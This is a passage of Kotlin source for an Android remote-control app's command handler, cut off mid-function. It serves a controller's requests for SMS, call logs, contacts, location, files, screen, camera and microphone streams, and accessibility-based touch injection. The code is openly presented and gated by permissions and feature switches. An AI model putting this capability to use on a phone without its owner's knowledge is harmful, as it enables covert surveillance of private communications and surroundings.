package cn.ppps.forwarder.relay

import android.content.ContentUris
import android.content.ContentValues
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.app.KeyguardManager
import android.content.Context
import android.os.BatteryManager
import android.os.Build
import android.os.PowerManager
import android.provider.ContactsContract
import androidx.core.content.ContextCompat
import cn.ppps.forwarder.utils.Log
import cn.ppps.forwarder.App
import cn.ppps.forwarder.entity.BatteryInfo
import cn.ppps.forwarder.entity.CallInfo
import cn.ppps.forwarder.entity.CloneInfo
import cn.ppps.forwarder.entity.ContactInfo
import cn.ppps.forwarder.entity.LocationInfo
import cn.ppps.forwarder.server.model.BaseResponse
import cn.ppps.forwarder.server.model.CallQueryData
import cn.ppps.forwarder.server.model.ConfigData
import cn.ppps.forwarder.server.model.ContactQueryData
import cn.ppps.forwarder.server.model.SmsQueryData
import cn.ppps.forwarder.utils.AppUtils
import cn.ppps.forwarder.utils.BatteryUtils
import cn.ppps.forwarder.utils.HttpServerUtils
import cn.ppps.forwarder.utils.PhoneUtils
import cn.ppps.forwarder.utils.RelaySettings
import cn.ppps.forwarder.utils.SettingUtils
import com.google.gson.Gson
import com.google.gson.GsonBuilder
import com.xuexiang.xutil.XUtil
import java.io.File
import java.net.DatagramPacket
import java.net.DatagramSocket
import java.net.InetAddress
import java.util.Base64
import java.util.Locale

/**
 * 被控端命令处理器
 * 根据12字节命令前缀分发到对应功能，返回统一 BaseResponse JSON 报文。
 */
object RelayServerHandler {
    private const val TAG = "RelayServerHandler"

    /** ★ 2026-08-10 替换已删除控制端gson：使用本地Gson单例 */
    private val gson: Gson = GsonBuilder().serializeNulls().create()

    // ==================== ★ WebRTC 会话：被控端作为 ANSWERER（控制端发 OFFER） ====================
    /** 当前活跃的 WebRTC 会话；WebRTC模式下 摄像头+麦克风 都由 WebRtcSessionManager 统一管理 */
    @Volatile
    private var webrtc: WebRtcSessionManager? = null
    /** WebRTC 启动时请求的摄像头索引，用于失败回退到老 JPEG+PCM 模式 */
    @Volatile
    private var webrtcCameraIndex: Int = 0
    /** ★ 2026-08-11 当前WebRTC会话是否纯音频模式（麦克风WebRTC）：回退时只启老麦克风，不启摄像头 */
    @Volatile
    private var webrtcAudioOnly: Boolean = false

    /** 给 WebRtcSessionManager 发信令/状态：复用 sender(RelaySender) 的 sendText()/sendBin()，
     *  因 RelayServerHandler.handle 返回 String→String，所以直接用 sender 回发包 */
    private fun makeWebrtcSignalingCallback(sender: RelaySender): WebRtcSessionManager.SignalingCallback {
        return object : WebRtcSessionManager.SignalingCallback {
            override fun onSignalingMessage(cmd: String, payloadText: String) {
                Log.i(TAG, "★ WebRTC→Ctrl 发信令 cmd=$cmd payloadLen=${payloadText.length} senderType=${sender.javaClass.simpleName} connected=${sender.isConnected()}")
                try {
                    // ★ 2026-08-11 关键修复：OFFER/ANSWER SDP 大帧(>4KB)必须同步发送，
                    //   防止异步sendExecutor排队后socket异常关闭导致frame丢失
                    val payloadBytes = payloadText.toByteArray(Charsets.UTF_8)
                    if (cmd == RelayCommands.CMD_WEBRTC_ANSWER || cmd == RelayCommands.CMD_WEBRTC_OFFER) {
                        val ok = sender.sendSync(cmd, payloadBytes, 10000)
                        Log.i(TAG, "★ WebRTC→Ctrl 同步发送 $cmd 结果=$ok frameLen=${12 + payloadBytes.size}")
                        if (!ok) {
                            // 失败：等待重连后重试一次
                            Log.w(TAG, "★ WebRTC→Ctrl 同步发送 $cmd 失败，等待重连后重试...")
                            if (waitForConnection(sender, 8000)) {
                                val ok2 = sender.sendSync(cmd, payloadBytes, 10000)
                                Log.i(TAG, "★ WebRTC→Ctrl 重试发送 $cmd 结果=$ok2")
                            } else {
                                Log.w(TAG, "★ WebRTC→Ctrl 重试超时：重连未在8秒内恢复")
                            }
                        }
                    } else {
                        sender.send(cmd, payloadText)
                    }
                } catch (t: Throwable) {
                    Log.w(TAG, "WebRTC onSignalingMessage 发送失败: ${t.message}", t)
                }
            }
            override fun onStatus(state: String, detail: String) {
                Log.i(TAG, "★ WebRTC state=$state detail=$detail")
                try {
                    sender.send(RelayCommands.CMD_WEBRTC_STATUS, "$state|$detail")
                } catch (_: Throwable) {}
            }
            override fun onError(reason: String) {
                Log.e(TAG, "★ WebRTC 出错，尝试回退到老模式：$reason")
                val fallbackCamera = webrtcCameraIndex
                val fallbackSender = sender
                // ★ 2026-08-11 判断当前会话是否纯音频模式（麦克风WebRTC）：回退时只启动老麦克风，不启动摄像头
                val webrtcIsAudioOnly = webrtcAudioOnly
                // ★★★ 2026-08-14 修复"摄像头被占用后回退失败/后续全部无图像"：
                //   根因：onError 在 WebRTC 捕获线程被回调 → close()(@Synchronized) 内 videoCapturer.stopCapture()
                //   会等待【捕获线程自身】退出 → 死锁 → 回退Thread永不启动 → 摄像头不推流；
                //   且卡死的close()持有this锁 → 后续新OFFER/挂断的webrtc?.close()也等锁 → 屏幕预览/麦克风全失效。
                //   修复：回退Thread提前启动(不依赖close完成)，close()移入回退线程异步执行(非捕获线程→不阻塞)。
                Thread {
                    try {
                        try { webrtc?.close() } catch (_: Throwable) {}
                        webrtc = null
                        // —— 1) 老摄像头：JPEG推（纯音频模式跳过，不占用摄像头）
                        if (!webrtcIsAudioOnly) {
                            val okCam = CameraStreamManager.start(fallbackCamera)
                            Log.i(TAG, "★ WebRTC回退：摄像头 ${if (okCam) "成功" else "失败:${CameraStreamManager.lastError()}"}")
                            try {
                                fallbackSender.send(
                                    RelayCommands.CMD_CAMERA_STATUS_REPORT,
                                    if (okCam) "$fallbackCamera|success|摄像头流已启动(webrtc回退模式)"
                                    else "$fallbackCamera|failed|${CameraStreamManager.lastError()}(webrtc回退失败)"
                                )
                            } catch (_: Throwable) {}
                        }
                        // —— 2) 老麦克风：PCM推（仅在权限OK时）
                        val hasPerm = try {
                            ContextCompat.checkSelfPermission(App.context,
                                android.Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
                        } catch (_: Throwable) { false }
                        if (hasPerm) {
                            val sessionId = MicrophoneStreamManager.start(fallbackSender, RelaySettings.relayHost, -1, CHANNEL_RELAY)
                            if (sessionId != null) {
                                Log.i(TAG, "★ WebRTC回退：麦克风 数据通道 OK")
                            } else {
                                val okMic = MicrophoneStreamManager.start(fallbackSender)
                                Log.i(TAG, "★ WebRTC回退：麦克风 命令通道 ${if (okMic) "OK" else "FAIL:${MicrophoneStreamManager.lastError()}"}")
                                // ★★★ 2026-08-13 老麦克风也启动失败（如被视频通话占用）→ 明确反馈控制端"为什么没有声音"
                                if (!okMic) {
                                    try {
                                        fallbackSender.send(RelayCommands.CMD_WEBRTC_STATUS,
                                            "mic_failed|${MicrophoneStreamManager.lastError()}")
                                    } catch (_: Throwable) {}
                                }
                            }
                        }
                        // —— 3) 通知控制端：我们回退了，控制端按老模式继续显示+播放即可
                        try {
                            fallbackSender.send(RelayCommands.CMD_WEBRTC_STATUS,
                                "fallback_legacy|WebRTC失败已回退老模式: $reason")
                        } catch (_: Throwable) {}
                    } catch (t: Throwable) {
                        Log.w(TAG, "WebRTC回退到老模式时再次失败: ${t.message}")
                    }
                }.start()
            }
        }
    }

    /** ★ 命令来源通道常量：供ScreenStreamManager等按通道决定推流模式 */
    const val CHANNEL_RELAY = 0    // 命令经中继连接到达（被控端→中继56786）
    const val CHANNEL_DIRECT = 1   // 命令经直连监听(56786)到达（控制端ZT/局域网直连）
    const val CHANNEL_ZT = 2       // 命令经TS直连(56789)到达（被控端主动连接控制端）

    /** ★ TS直连启动器（由RelayServerService设置，触发后主动连接控制端56789） */
    var ztDirectLauncher: ((phoneIp: String, port: Int) -> Unit)? = null

    /** ★ 文件下载取消标志（控制端发送CMD_FS_CANCEL后置为true，下载线程每块发送前检查） */
    @Volatile
    var fsDownloadCancelled = false

    /** ★ 当前运行的文件下载线程（互斥：同一时间只允许一个下载线程，
     *  防止旧下载残留线程与新下载并发写同一socket导致帧交错、ACK丢失） */
    @Volatile
    private var fsDownloadThread: Thread? = null

    /** ★ 文件下载分块确认（参照PC微信分块传输）：控制端每收到一块回CMD_FS_ACK+块序号，
     *  被控端发送后等待此序号确认，未确认不继续发送，防止中继→控制端链路拥塞丢数据 */
    @Volatile
    private var fsAckBlock = -1L

    /** ★ 本机虚拟网IP缓存（60秒）：Tailscale 100.64-100.127.x */
    private var ownZtIpsCache: Set<String>? = null
    private var ownZtIpsCacheTime = 0L

    /** 获取本机虚拟网IP（Tailscale 100.64.x，与PC被控端逻辑一致） */
    fun getOwnZtIps(): Set<String> {
        val now = System.currentTimeMillis()
        if (ownZtIpsCache != null && now - ownZtIpsCacheTime < 60000) return ownZtIpsCache!!
        val ips = LinkedHashSet<String>()
        // ★ 2026-08-16 修复：只使用 Tailscale 后端 Self IP（自己 App 的节点）。
        //   不再枚举网卡——同一手机上"控制端App的VPN接口IP"也会被 NetworkInterface 枚举到，
        //   导致把控制端IP(如100.106.79.58)误判为本机 → scanZtMembers 的 ip in own 跳过控制端探测，
        //   isOwnIp 也误判 → 中继关闭后被控端无法通过扫描发现控制端，彻底连不上。
        try {
            cn.ppps.forwarder.tailscale.TailscaleManager.getSelfIp()?.let { ips.add(it) }
        } catch (_: Throwable) {
        }
        ownZtIpsCache = ips
        ownZtIpsCacheTime = now
        return ips
    }

    /** 判断是否为 Tailscale CGNAT 段（100.64.0.0/10） */
    private fun isTailscaleCgnat(ip: String): Boolean {
        val p = ip.split(".")
        if (p.size != 4 || p[0] != "100") return false
        return p[1].toIntOrNull()?.let { it in 64..127 } ?: false
    }

    private fun success(data: Any?): String {
        val resp = BaseResponse<Any?>(
            code = 200,
            msg = "success",
            data = data,
            timestamp = System.currentTimeMillis(),
            sign = "",
        )
        return gson.toJson(resp)
    }

    private fun error(msg: String): String {
        val resp = BaseResponse<Any?>(
            code = 500,
            msg = msg,
            data = null,
            timestamp = System.currentTimeMillis(),
            sign = "",
        )
        return gson.toJson(resp)
    }

    /**
     * 处理收到的命令
     * @param channel 命令来源通道：CHANNEL_RELAY / CHANNEL_DIRECT / CHANNEL_ZT（供屏幕推流模式选择）
     * @param sender 命令来源通道的发送器（★ 2026-08-06新增：文件下载等二进制推送用，由RelayServerService传入）
     * @return (响应命令, 响应负载JSON)，未知命令返回 null
     */
    fun handle(cmd: String, payload: ByteArray, channel: Int = CHANNEL_RELAY,
               sender: RelaySender? = null): Pair<String, String>? {
        val payloadText = String(payload, Charsets.UTF_8)
        return try {
            when (cmd) {
                RelayCommands.CMD_GET_CONFIG -> RelayCommands.RSP_CONFIG to success(handleConfig())

                // ★ Tailscale直连请求（中继在线时触发）：负载 "目标Tailscale IP|控制端Tailscale IP|端口"
                RelayCommands.CMD_ZT_DIRECT_CONNECT -> {
                    val parts = payloadText.split("|")
                    if (parts.size >= 3) {
                        val targetIp = parts[0].trim()
                        val phoneIp = parts[1].trim()
                        val port = parts.getOrNull(2)?.trim()?.toIntOrNull() ?: RelayCommands.ZT_DIRECT_PORT
                        if (targetIp in getOwnZtIps()) {
                            Log.i(TAG, "★ 收到TS直连请求，目标匹配本机，主动连接控制端 $phoneIp:$port")
                            ztDirectLauncher?.invoke(phoneIp, port)
                        } else {
                            Log.i(TAG, "TS直连目标 $targetIp 不是本机 (本机: ${getOwnZtIps()})，忽略")
                        }
                    }
                    null  // 直连触发无需响应
                }

                RelayCommands.CMD_PING -> {
                    // ★ 心跳探测：响应 pong（同时保持中继链路活跃，防止NAT超时断连）
                    RelayCommands.RSP_PONG to "pong"
                }

                RelayCommands.CMD_BATTERY -> {
                    if (!HttpServerUtils.enableApiBatteryQuery) return RelayCommands.RSP_BATTERY to error("服务端已禁用该功能")
                    RelayCommands.RSP_BATTERY to success(handleBattery())
                }

                // ==================== 文件系统（2026-08-06新增） ====================
                RelayCommands.CMD_FS_LIST -> {
                    // ★ 列目录：同步发送（参照文件下载的可靠发送），确保写入socket成功才返回
                    //   目录JSON可能较大（几千个文件几十KB），异步send在拥塞时可能被中继丢弃导致控制端超时
                    startFsList(payloadText, sender)
                    null
                }

                RelayCommands.CMD_FS_DELETE -> {
                    RelayCommands.RSP_FS_DELETE to handleFsDelete(payloadText)
                }

                RelayCommands.CMD_FS_GET -> {
                    // ★ 下载：启动后台线程推送（RSP_FS_GET → CMD_FS_DATA分块 → CMD_FS_DONE），此处不返回
                    startFsDownload(payloadText, sender)
                    null
                }

                RelayCommands.CMD_FS_CANCEL -> {
                    // ★ 取消下载：设置取消标志，下载线程在下一块发送前检测到后立即退出
                    //   通过专用命令通道（非数据通道）发送，响应RSP_FS_CANCEL确认已停止
                    Log.i(TAG, "★ 收到取消下载命令，设置取消标志")
                    fsDownloadCancelled = true
                    RelayCommands.RSP_FS_CANCEL to "1|stopped|已停止发送"
                }

                RelayCommands.CMD_FS_ACK -> {
                    // ★ 分块确认：控制端收到数据块后回ACK，负载=块序号（被控端据此继续下一块）
                    val ack = payloadText.trim().toLongOrNull() ?: -1L
                    Log.i(TAG, "[FS调试] 收到ACK cmd=${RelayCommands.CMD_FS_ACK} 原始负载=[${payloadText}] 解析=$ack time=${System.currentTimeMillis()}")
                    if (ack >= 0) fsAckBlock = ack
                    null  // ACK无需响应
                }

                RelayCommands.CMD_SMS_QUERY -> {
                    if (!HttpServerUtils.enableApiSmsQuery) return RelayCommands.RSP_SMS_QUERY to error("服务端已禁用该功能")
                    val data = parseData(payloadText, SmsQueryData::class.java) ?: SmsQueryData()
                    val list = PhoneUtils.getSmsInfoList(data.type, data.pageSize, (data.pageNum - 1) * data.pageSize, data.keyword)
                    RelayCommands.RSP_SMS_QUERY to success(list)
                }

                RelayCommands.CMD_CALL_QUERY -> {
                    if (!HttpServerUtils.enableApiCallQuery) return RelayCommands.RSP_CALL_QUERY to error("服务端已禁用该功能")
                    val data = parseData(payloadText, CallQueryData::class.java) ?: CallQueryData()
                    val list = PhoneUtils.getCallInfoList(data.type, data.pageSize, (data.pageNum - 1) * data.pageSize, data.phoneNumber)
                    RelayCommands.RSP_CALL_QUERY to success(list)
                }

                RelayCommands.CMD_CONTACT_QUERY -> {
                    if (!HttpServerUtils.enableApiContactQuery) return RelayCommands.RSP_CONTACT_QUERY to error("服务端已禁用该功能")
                    val data = parseData(payloadText, ContactQueryData::class.java) ?: ContactQueryData()
                    val list = PhoneUtils.getContactInfoList(data.pageSize, (data.pageNum - 1) * data.pageSize, data.phoneNumber, data.name)
                    RelayCommands.RSP_CONTACT_QUERY to success(list)
                }

                RelayCommands.CMD_CONTACT_ADD -> {
                    if (!HttpServerUtils.enableApiContactAdd) return RelayCommands.RSP_CONTACT_ADD to error("服务端已禁用该功能")
                    val data = parseData(payloadText, ContactInfo::class.java)
                    if (data == null || data.name.isNullOrEmpty() || data.phoneNumber.isNullOrEmpty()) {
                        RelayCommands.RSP_CONTACT_ADD to error("姓名或号码为空")
                    } else {
                        handleContactAdd(data)
                        RelayCommands.RSP_CONTACT_ADD to success("success")
                    }
                }

                RelayCommands.CMD_LOCATION -> {
                    if (!HttpServerUtils.enableApiLocation) return RelayCommands.RSP_LOCATION to error("服务端已禁用该功能")
                    RelayCommands.RSP_LOCATION to success(handleLocation())
                }

                RelayCommands.CMD_CLONE_PULL -> {
                    if (!HttpServerUtils.enableApiClone) return RelayCommands.RSP_CLONE to error("服务端已禁用该功能")
                    val cloneInfo = parseData(payloadText, CloneInfo::class.java)
                    if (cloneInfo != null && cloneInfo.versionCode > 0) {
                        HttpServerUtils.compareVersion(cloneInfo)
                    }
                    RelayCommands.RSP_CLONE to success(HttpServerUtils.exportSettings())
                }

                RelayCommands.CMD_CLONE_PUSH -> {
                    if (!HttpServerUtils.enableApiClone) return RelayCommands.RSP_CLONE to error("服务端已禁用该功能")
                    val json = payloadText.removePrefix("push|")
                    val cloneInfo = parseData(json, CloneInfo::class.java)
                    if (cloneInfo == null) {
                        RelayCommands.RSP_CLONE to error("推送数据无效")
                    } else {
                        HttpServerUtils.compareVersion(cloneInfo)
                        val ok = HttpServerUtils.restoreSettings(cloneInfo)
                        RelayCommands.RSP_CLONE to if (ok) success("success") else error("还原设置失败")
                    }
                }

                RelayCommands.CMD_RD_START -> {
                    // 屏幕预览（远程桌面）：负载格式 host|port|FPS|色深|质量|clientId
                    val parts = payloadText.split("|")
                    val fps = parts.getOrNull(2)?.toIntOrNull() ?: 15
                    val quality = parts.getOrNull(4)?.toIntOrNull() ?: 50
                    val clientId = parts.getOrNull(5)?.toIntOrNull() ?: -1
                    // ★ 按命令来源通道决定推流模式（中继→PUSHER；直连/ZT→监听56788）
                    val ok = ScreenStreamManager.startStream(RelaySettings.relayHost, clientId, fps, quality, channel)
                    if (ok) {
                        RelayCommands.RSP_RD_START_ACK to RelayCommands.RELAY_VIDEO_PORT.toString()
                    } else {
                        RelayCommands.RSP_RD_START_ACK to error("屏幕捕获未授权，请先在被控端开启屏幕预览授权")
                    }
                }

                RelayCommands.CMD_RD_STOP -> {
                    ScreenStreamManager.stop()
                    RelayCommands.RSP_RD_START_ACK to success("success")
                }

                // ==================== 远程触摸操控（无障碍手势注入） ====================
                RelayCommands.CMD_RD_MOUSE_DOWN -> {
                    touchUnavailable() ?: run {
                        val (nx, ny) = parseCoords(payloadText)
                        TouchControlService.instance?.touchDown(nx, ny)
                        null
                    }
                }

                RelayCommands.CMD_RD_MOUSE_MOVE -> {
                    touchUnavailable() ?: run {
                        val (nx, ny) = parseCoords(payloadText)
                        TouchControlService.instance?.touchMove(nx, ny)
                        null
                    }
                }

                RelayCommands.CMD_RD_MOUSE_UP -> {
                    touchUnavailable() ?: run {
                        val (nx, ny) = parseCoords(payloadText)
                        TouchControlService.instance?.touchUp(nx, ny)
                        null
                    }
                }

                RelayCommands.CMD_RD_MOUSE_DBL -> {
                    touchUnavailable() ?: run {
                        val (nx, ny) = parseCoords(payloadText)
                        val svc = TouchControlService.instance
                        if (svc != null) {
                            val metrics = App.context.resources.displayMetrics
                            svc.tap(nx * metrics.widthPixels, ny * metrics.heightPixels)
                            Thread.sleep(50)
                            svc.tap(nx * metrics.widthPixels, ny * metrics.heightPixels)
                        }
                        null
                    }
                }

                RelayCommands.CMD_RD_MOUSE_WHEEL -> {
                    touchUnavailable() ?: run {
                        val delta = payloadText.trim().toIntOrNull() ?: 0
                        val svc = TouchControlService.instance
                        if (svc != null) {
                            val metrics = App.context.resources.displayMetrics
                            val cx = metrics.widthPixels / 2f
                            val cy = metrics.heightPixels / 2f
                            val dy = delta * 200
                            svc.swipe(cx, cy, cx, cy - dy, 300)
                        }
                        null
                    }
                }

                // ==================== 点亮屏幕解锁 ====================
                RelayCommands.CMD_WAKEUP_SCREEN -> {
                    // ★ 改用悬浮窗方案：MIUI/Android10+ 拦截后台启动Activity，悬浮窗可正常点亮
                    val ok = ScreenLighter.lightUp(App.context)
                    if (ok) {
                        Log.i(TAG, "已执行点亮屏幕")
                        // ★ 返回执行结果给控制端，让控制端显示成功/失败
                        RelayCommands.RSP_SCREEN_CTRL to "1|success|点亮屏幕成功"
                    } else {
                        RelayCommands.RSP_ERROR to error("被控端未授予悬浮窗权限（显示在其他应用上层），无法点亮屏幕，请在系统设置中开启")
                    }
                }

                // ==================== 熄灭屏幕 ====================
                RelayCommands.CMD_SCREEN_OFF -> {
                    // ★ 通过无障碍服务执行全局锁屏动作熄灭屏幕（等同电源键锁屏）
                    val svc = TouchControlService.instance
                    if (svc == null) {
                        RelayCommands.RSP_ERROR to error("被控端未开启远程触摸（无障碍）服务，请在系统设置-无障碍中开启后重试")
                    } else {
                        val ok = svc.screenOff()
                        if (ok) {
                            Log.i(TAG, "已执行熄屏")
                            // ★ 返回执行结果给控制端
                            RelayCommands.RSP_SCREEN_CTRL to "1|success|熄屏成功"
                        } else {
                            RelayCommands.RSP_ERROR to error("熄屏失败：系统版本过低或无障碍服务异常")
                        }
                    }
                }

                // ==================== 版本确认（PC协议兼容，控制端用于确认被控端在线） ====================
                RelayCommands.CMD_GET_VERSION -> {
                    val versionName = try { AppUtils.getAppVersionName() } catch (_: Exception) { "1.0" }
                    val deviceName = try {
                        (android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL).trim()
                    } catch (_: Exception) { "Android" }
                    // 负载格式与PC被控端一致: 版本|设备名|用户|isAdmin|isService（纯ASCII，编码安全）
                    RelayCommands.CMD_VERSION_INFO to "$versionName|$deviceName|Android|0|0"
                }

                // ★★★ 2026-08-17 方案C：反向查询设备状态（控制端主动探活心跳）
                //   收到后立即采集设备状态并回 CMD_DEV_STATE（与被动5秒上报同格式）
                //   中继识别此命令不更新 last_sender，安全（不会覆盖下载路由导致下载卡死）
                RelayCommands.CMD_GET_DEV_STATE -> {
                    val state = buildDeviceStateForQuery()
                    Log.i(TAG, "★ 收到 CMD_GET_DEV_STATE 主动探活，回 devstate: $state")
                    RelayCommands.CMD_DEV_STATE to state
                }

                RelayCommands.CMD_CAMERA_STREAM_START -> {
                    if (!HttpServerUtils.enableApiCamera) return RelayCommands.CMD_CAMERA_STATUS_REPORT to error("0|failed|服务端已禁用摄像头")
                    val index = payloadText.toIntOrNull() ?: 0
                    val ok = CameraStreamManager.start(index)
                    RelayCommands.CMD_CAMERA_STATUS_REPORT to if (ok) "$index|success|摄像头流已启动" else "$index|failed|${CameraStreamManager.lastError()}"
                }

                RelayCommands.CMD_CAMERA_STREAM_STOP -> {
                    CameraStreamManager.stop()
                    RelayCommands.CMD_CAMERA_STATUS_REPORT to "0|success|摄像头流已停止"
                }

                RelayCommands.CMD_SYS_STATUS -> {
                    // ★ 中继系统状态广播：更新手机控制端连接状态（不响应）
                    when (payloadText.trim()) {
                        RelayCommands.SYS_CTRL_ON -> cn.ppps.forwarder.service.RelayServerService.isControllerOnline = true
                        RelayCommands.SYS_CTRL_OFF -> cn.ppps.forwarder.service.RelayServerService.isControllerOnline = false
                    }
                    Log.i(TAG, "中继系统状态: $payloadText -> 控制端在线=${cn.ppps.forwarder.service.RelayServerService.isControllerOnline}")
                    null
                }

                // ==================== 麦克风采集推流（远程免提播放被控端声音） ====================
                RelayCommands.CMD_MIC_START -> {
                    val hasPermission = try {
                        ContextCompat.checkSelfPermission(
                            App.context,
                            android.Manifest.permission.RECORD_AUDIO
                        ) == PackageManager.PERMISSION_GRANTED
                    } catch (_: Exception) { false }
                    if (!hasPermission) {
                        RelayCommands.RSP_ERROR to error("被控端未授予麦克风权限（录制音频），请在被控端系统设置或一键授权中开启后重试")
                    } else {
                        // ★ 2026-08-09 双通道：使用数据通道(PUSHER/LISTENER)传输音频
                        // 优先尝试数据通道（中继模式连中继，直连模式监听端口），失败则回退命令通道
                        val sessionId = MicrophoneStreamManager.start(sender, RelaySettings.relayHost, -1, channel)
                        if (sessionId != null) {
                            Log.i(TAG, "麦克风采集已启动（数据通道模式），session=$sessionId")
                            null
                        } else {
                            // 数据通道启动失败，回退到命令通道
                            val ok = MicrophoneStreamManager.start(sender)
                            if (ok) {
                                Log.i(TAG, "麦克风采集已启动（命令通道回退模式）")
                                null
                            } else {
                                RelayCommands.RSP_ERROR to error("启动麦克风采集失败：${MicrophoneStreamManager.lastError()}")
                            }
                        }
                    }
                }

                RelayCommands.CMD_MIC_STOP -> {
                    MicrophoneStreamManager.stop()
                    Log.i(TAG, "麦克风采集已停止")
                    null  // 停止命令无需响应
                }

                // ==================== ★ WebRTC 一站式音视频（摄像头预览 + 同步麦克风音频） ====================

                RelayCommands.CMD_WEBRTC_OFFER -> {
                    val s = sender ?: return RelayCommands.RSP_ERROR to error("内部错误: RelaySender为空")
                    Log.i(TAG, "★ [WebRTC OFFER IN] 收到 OFFER，payload总长度=${payloadText.length}，sender=$s")
                    // ★ 2026-08-11 先解析cameraIndex与SDP，判断是否纯音频模式（麦克风WebRTC，OFFER无m=video）
                    val firstPipeIdx = payloadText.indexOf('|')
                    var idx = 0
                    var offerB64 = ""
                    var audioOnly = false
                    if (firstPipeIdx > 0) {
                        idx = payloadText.substring(0, firstPipeIdx).toIntOrNull() ?: 0
                        offerB64 = payloadText.substring(firstPipeIdx + 1)
                        try {
                            val sdpRaw = String(Base64.getDecoder().decode(offerB64), Charsets.UTF_8)
                            audioOnly = !sdpRaw.contains("m=video")
                            Log.i(TAG, "★ [WebRTC OFFER IN] 解析: cameraIndex=$idx, offerB64Len=${offerB64.length}, audioOnly(纯音频麦克风)=$audioOnly")
                        } catch (_: Throwable) {}
                    }
                    // 先权限检查（摄像头+麦克风；纯音频模式只要求麦克风）
                    val permCamera = try {
                        ContextCompat.checkSelfPermission(App.context,
                            android.Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
                    } catch (_: Throwable) { false }
                    val permAudio = try {
                        ContextCompat.checkSelfPermission(App.context,
                            android.Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
                    } catch (_: Throwable) { false }
                    Log.i(TAG, "★ [WebRTC OFFER IN] 权限检查: CAMERA=$permCamera, RECORD_AUDIO=$permAudio, enableApiCamera=${HttpServerUtils.enableApiCamera}, audioOnly=$audioOnly")
                    // ★ 2026-08-11 纯音频模式：只要求RECORD_AUDIO权限；摄像头权限/开关不要求
                    val needCamera = !audioOnly
                    if ((needCamera && !permCamera) || !permAudio) {
                        // 无权限：直接走"优雅回退"，告知控制端 fallback
                        val missing = mutableListOf<String>()
                        if (needCamera && !permCamera) missing += "相机(CAMERA)"
                        if (!permAudio) missing += "麦克风(RECORD_AUDIO)"
                        Log.w(TAG, "★ WebRTC OFFER 到达但缺权限: ${missing.joinToString()}，按回退模式启动老JPEG+PCM")
                        // 解析 cameraIndex，直接触发 onError → 回退代码
                        webrtcCameraIndex = idx
                        makeWebrtcSignalingCallback(s).onError("被控端缺权限: ${missing.joinToString()}")
                        return null
                    }
                    if (needCamera && !HttpServerUtils.enableApiCamera) {
                        // 禁用摄像头也回退老模式
                        webrtcCameraIndex = idx
                        makeWebrtcSignalingCallback(s).onError("服务端已禁用摄像头")
                        return null
                    }
                    // 解析 payload = cameraIndex|offerSdpBase64
                    if (firstPipeIdx < 0) {
                        Log.e(TAG, "★ [WebRTC OFFER IN] OFFER格式非法: 找不到'|'分隔符")
                        return RelayCommands.RSP_ERROR to error("OFFER格式非法: 应为 \"摄像头索引|SDP_BASE64\"")
                    }
                    Log.i(TAG, "★ [WebRTC OFFER IN] 解析成功: cameraIndex=$idx, offerB64Len=${offerB64.length}")
                    webrtcCameraIndex = idx
                    webrtcAudioOnly = audioOnly
                    // —— 先关闭旧 WebRTC / 旧 JPEG+PCM 会话（避免冲突）
                    try { webrtc?.close() } catch (_: Throwable) {}
                    try { CameraStreamManager.stop() } catch (_: Throwable) {}
                    try { MicrophoneStreamManager.stop() } catch (_: Throwable) {}
                    webrtc = null
                    // —— 初始化新 WebRTC 会话
                    val mgr = WebRtcSessionManager(App.context)
                    webrtc = mgr
                    val cb = makeWebrtcSignalingCallback(s)
                    // ★★★ 2026-08-12 中继优先模式：OFFER经中继到达(CHANNEL_RELAY)→relayPreferred=true
                    //   （媒体走TURN中继转发）；经TS直连/直连监听到达(CHANNEL_ZT/DIRECT)→relayPreferred=false
                    //   （媒体走TS/WiFi host直连兜底）。符合"中继优先，中继不可用时才TS直连"。
                    val relayPreferred = (channel == CHANNEL_RELAY)
                    Log.i(TAG, "★ [WebRTC OFFER IN] 开始异步启动 WebRtcSessionManager.startWithOffer"
                        + " channel=$channel relayPreferred=$relayPreferred"
                        + "（${if (relayPreferred) "中继优先→媒体走TURN中继" else "直连兜底→媒体走TS/WiFi直连"}）...")
                    // 启动放到子线程（createAnswer/setRemoteDescription 会阻塞）
                    Thread {
                        try {
                            mgr.startWithOffer(idx, offerB64, cb, relayPreferred)
                            Log.i(TAG, "★ [WebRTC OFFER IN] startWithOffer 线程执行完毕（ANSWER 将由 signaling callback 异步发送）")
                        } catch (t: Throwable) {
                            Log.e(TAG, "★ [WebRTC OFFER IN] startWithOffer 异常: type=${t.javaClass.name} msg=${t.message}", t)
                            cb.onError("startWithOffer exception: ${t.message}")
                        }
                    }.start()
                    null  // OFFER不立即响应，ANSWER/STATUS 由 signaling callback 异步通过 sender 发回
                }

                RelayCommands.CMD_WEBRTC_CANDIDATE -> {
                    // 格式: OFFERER/ANSWERER|sdpMid|sdpMLineIndex|candidateSdpBase64
                    val parts = payloadText.split("|")
                    if (parts.size < 4) {
                        Log.w(TAG, "★ WebRTC ICE candidate 字段不足")
                        return null
                    }
                    val sdpMid = parts[1]
                    val lineIdx = parts[2].toIntOrNull() ?: 0
                    val candB64 = parts[3]
                    webrtc?.addRemoteIceCandidate(sdpMid, lineIdx, candB64)
                    null
                }

                RelayCommands.CMD_WEBRTC_ANSWER -> {
                    // 被控端是 ANSWERER，不会收到 ANSWER；正常忽略（除非双向通话）
                    Log.i(TAG, "★ WebRTC 收到 ANSWER（被控端是ANSWERER，忽略）")
                    null
                }

                RelayCommands.CMD_WEBRTC_HANGUP -> {
                    Log.i(TAG, "★ WebRTC 挂断")
                    try { webrtc?.close() } catch (_: Throwable) {}
                    webrtc = null
                    webrtcAudioOnly = false
                    // 控制端挂断时，老模式也可能残留（如回退过），一并清理
                    try { CameraStreamManager.stop() } catch (_: Throwable) {}
                    try { MicrophoneStreamManager.stop() } catch (_: Throwable) {}
                    null
                }

                else -> null
            }
        } catch (e: Exception) {
            Log.e(TAG, "处理命令异常: $cmd ${e.message}")
            RelayCommands.RSP_ERROR to error(e.message ?: "未知错误")
        }
    }

    /** ★ 2026-08-17 方案C：采集设备状态（与 RelayServerService.buildDeviceState 同格式）
     *   用于响应 CMD_GET_DEV_STATE 主动探活。通过 App.context 获取系统服务，独立于 Service 实例。
     *   不修改 RelayServerService.buildDeviceState 可见性，避免影响被动5秒上报逻辑。 */
    private fun buildDeviceStateForQuery(): String {
        val ctx = App.context
        // 名称：用户备注优先，否则用品牌+型号
